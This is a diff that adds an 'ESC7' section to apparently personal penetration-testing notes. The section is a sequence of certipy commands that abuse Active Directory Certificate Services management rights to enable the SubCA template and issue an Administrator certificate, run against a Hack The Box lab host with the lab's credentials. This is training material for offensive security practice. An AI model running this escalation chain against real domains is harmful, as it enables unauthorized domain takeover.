@@ -220,3 +220,21 @@ certreq -q -new request.inf request.pem
 certreq -q -submit request.pem cert.pem
 certreq -q -accept cert.pem
 ```
+
+
+ESC7
+---
+```sh
+certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.145.165 -vulnerable -stdout -text
+
+#ESC7
+certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+
+certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+
+certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn Administrator@manager.htb -debug
+
+certipy ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+
+certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 23
+```
